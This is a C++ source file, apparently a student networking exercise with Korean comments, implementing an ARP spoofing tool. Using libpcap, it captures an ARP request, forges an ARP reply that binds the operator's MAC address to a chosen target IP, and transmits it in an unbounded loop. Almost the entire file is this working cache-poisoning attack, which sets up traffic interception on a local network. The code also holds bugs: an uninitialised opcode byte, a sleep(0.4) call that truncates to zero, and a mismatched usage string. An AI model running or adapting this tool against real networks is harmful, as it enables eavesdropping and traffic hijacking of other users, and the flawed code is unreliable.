#include <arpa/inet.h>
#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <libnet.h>
#include <pcap.h>
#include <stdint.h>
#include <string>
#include <unistd.h>


using namespace std;

#define ARP_SRC_MAC_LOC 6
#define ARP_ETH_TYPE_LOC 12
#define ARP_HW_TYPE_LOC 14
#define ARP_PROT_TYPE_LOC 16
#define ARP_HW_SIZE_LOC 18
#define ARP_PROT_SIZE_LOC 19
#define ARP_OPCODE_LOC 21
#define ARP_SENDER_MAC_LOC 22
#define ARP_SENDER_IP_LOC 28
#define ARP_TARGET_MAC_LOC 32
#define ARP_TARGET_IP_LOC 38

// how to use
void usage() {
    printf("syntax: send_arp <interface> <sender_ip> <target_ip>\n");
    printf("sample: pcap_test wlan0 192.168.10.2 192.168.10.1\n");
}


// Change Decimal IP to Hex IP
void IPDec_to_IPHex(char * ip, uint8_t ip_modified[]) {
    for(int i=0; i<4; i++)
        ip_modified[i] = inet_addr(ip) >> (8*i) & 0xFF;
}

// Get my MAC address (Script from Internet)
int get_my_mac(char *dev, uint8_t *mac)
{
    // Ethernet 관련 정보 필요할때 사용
    struct ifreq ifr;
    int fd;

    // return value - error value from df or ioctl call
    int rv;

    /* determine the local MAC address */
    //2번째 인자의 값을 1번째 인자로 복사 (ifr.ifr_name 은 interface name)
    strcpy(ifr.ifr_name, dev);

    // AF_INET = 네트워크 도메인 소켓(IPv4 프로토콜)
    // Sock_Dgram = 데이터그램 소켓, IPProto_ip = IP 프로토콜 사용
    fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (fd < 0)
        rv = fd;
    else
    {
        //SIOCGIFHWADDR 요청
        rv = ioctl(fd, SIOCGIFHWADDR, &ifr);
        if (rv >= 0) { /* worked okay */

            //SIOCGIFHWADDR 를 요청하면 ifreq 구조체의 sa_data를 6바이트 읽어낸다.
            memcpy(mac, ifr.ifr_hwaddr.sa_data, IFHWADDRLEN);
        }
    }
    return rv;
}

typedef struct packet_request {
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint8_t type[2];
    uint8_t hw_type[2];
    uint8_t protocol_type[2];
    uint8_t hardware_size;
    uint8_t protocol_size;
    uint8_t opcode[2];
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];

} Packet_request;

typedef struct packet_reply {
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint8_t type[2];
    uint8_t hw_type[2];
    uint8_t protocol_type[2];
    uint8_t hardware_size;
    uint8_t protocol_size;
    uint8_t opcode[2];
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
    uint8_t padding[18];
} Packet_reply;


int main(int argc, char* argv[])
{
    printf("Finding ARP Request packet... ");
    // Preparation for sending packet
    if (argc != 4) {
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    Packet_request packet_req;
    Packet_reply packet_rep;
    u_char packet_fake[42];
    int packet_request_full = 0;

    // Get my MAC and input into Packet_reply.source_mac
    if ( (get_my_mac(dev, packet_rep.src_mac) < 0) ) {
        fprintf(stderr, "couldn't get my mac %s: %s", dev, errbuf);
        return -1;
    }
    for(int i=0; i<6; i++) {
        packet_rep.sender_mac[i] = packet_rep.src_mac[i];
    }


    while (true) {
        struct pcap_pkthdr * header;
        const u_char * packet;


        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        // Check if type is ARP (if not, continue)
        if( !(( packet[LIBNET_ETH_H-2] == 0x08) && (packet[LIBNET_ETH_H-1] == 0x06)) )
            continue;

        // Check if ARP packet is for request
        if( packet[ARP_OPCODE_LOC] != 0x01 )
            continue;

        printf("Got it!.\n");
        printf("Collecting ARP Request packet... ");
        for(int i=0; i<int(header->caplen); i++) {
            // Saving Dest MAC
            if(i==0)
                for(int j=0; j<6; j++)
                    packet_req.dest_mac[j] = packet[j];

            // Saving Src MAC
            if(i==ARP_SRC_MAC_LOC)
                for(int j=0; j<6; j++)
                    packet_req.src_mac[j] = packet[i+j];

            // Saving Type
            if(i==ARP_ETH_TYPE_LOC)
                for(int j=0; j<2; j++)
                    packet_req.type[j] = packet[i+j];

            // Saving Hardware Type
            if(i==ARP_HW_TYPE_LOC)
                for(int j=0; j<2; j++)
                    packet_req.hw_type[j] = packet[i+j];

            // Saving Protocol Type
            if(i==ARP_PROT_TYPE_LOC)
                for(int j=0; j<2; j++)
                    packet_req.protocol_type[j] = packet[i+j];

            // Saving Hardware size
            packet_req.hardware_size = 0x06;

            // Saving Protocol size
            packet_req.protocol_size = 0x04;

            // Saving Opcode (Request)
            if(i==ARP_OPCODE_LOC)
                for(int j=0; j<2; j++) {
                    packet_req.opcode[j] = packet[i+j];
                }

            // Saving ARP Sender MAC
            if(i==ARP_SENDER_MAC_LOC)
                for(int j=0; j<6; j++)
                    packet_req.sender_mac[j] = packet[i+j];

            // Saving ARP Sender IP
            if(i==ARP_SENDER_IP_LOC)
                for(int j=0; j<4; j++)
                    packet_req.sender_ip[j] = packet[i+j];

            // Saving ARP Target MAC
            if(i==ARP_TARGET_MAC_LOC)
                for(int j=0; j<6; j++)
                    packet_req.target_mac[j] = packet[i+j];

            // Saving ARP Target IP
            if(i==ARP_TARGET_IP_LOC)
                for(int j=0; j<4; j++)
                    packet_req.target_ip[j] = packet[i+j];

            // Set signal that packet_request is full
            packet_request_full = 1;
        }



        if(packet_request_full == 1) {
            packet_request_full = 0;
            printf("Done.\n");
            break;
        }
    }

    printf("Making fake ARP packet... ");
    for(int i=0; i<42; i++) {
        // Saving Dest MAC
        if(i==0)
            for(int j=0; j<6; j++)
                packet_fake[j] = packet_req.sender_mac[j];

        // Saving Src MAC
        if(i==ARP_SRC_MAC_LOC)
            for(int j=0; j<6; j++)
                packet_fake[i+j] = packet_rep.src_mac[j] ;

        // Saving Type
        if(i==ARP_ETH_TYPE_LOC)
            for(int j=0; j<2; j++)
                packet_fake[i+j] = packet_req.type[j];

        // Saving Hardware Type
        if(i==ARP_HW_TYPE_LOC)
            for(int j=0; j<2; j++)
                packet_fake[i+j] = packet_req.hw_type[j];

        // Saving Protocol Type
        if(i==ARP_PROT_TYPE_LOC)
            for(int j=0; j<2; j++)
                packet_fake[i+j] = packet_req.protocol_type[j];

        // Saving Hardware size
        if(i==ARP_HW_SIZE_LOC)
            packet_fake[i] = packet_req.hardware_size;

        // Saving Protocol size
        if(i==ARP_PROT_SIZE_LOC)
            packet_fake[i] = packet_req.protocol_size;

        // Saving Opcode (Request)
        if(i==ARP_OPCODE_LOC+1) {
            packet_fake[i] = 0x02;
        }
        packet_fake[ARP_OPCODE_LOC] = 0x02;

        // Saving ARP Sender MAC
        if(i==ARP_SENDER_MAC_LOC)
            for(int j=0; j<6; j++)
                packet_fake[i+j] = packet_rep.sender_mac[j];

        // Saving ARP Sender IP
        if(i==ARP_SENDER_IP_LOC) {
            IPDec_to_IPHex(argv[3], packet_rep.sender_ip);
            for(int j=0; j<4; j++)
                packet_fake[i+j] = packet_rep.sender_ip[j];
        }

        // Saving ARP Target MAC
        if(i==ARP_TARGET_MAC_LOC)
            for(int j=0; j<6; j++)
                packet_fake[i+j] = packet_req.src_mac[j];

        // Saving ARP Target IP
        if(i==ARP_TARGET_IP_LOC) {
            IPDec_to_IPHex(argv[2], packet_rep.target_ip);
            for(int j=0; j<4; j++)
                packet_fake[i+j] = packet_req.target_ip[j];
        }

    }
    printf("Done.\n");

    for(int i=0; i<42; i++)
        printf("%02X ", packet_fake[i]);

    printf("\nTime to send fake ARP packet!\n");
    while (true) {
        if(pcap_sendpacket(handle, packet_fake, sizeof(packet_fake) ) != 0) {
            printf("Sending ARP packet failed.\n");
            break;
        }
        sleep(0.4);

    }
    return 0;
}
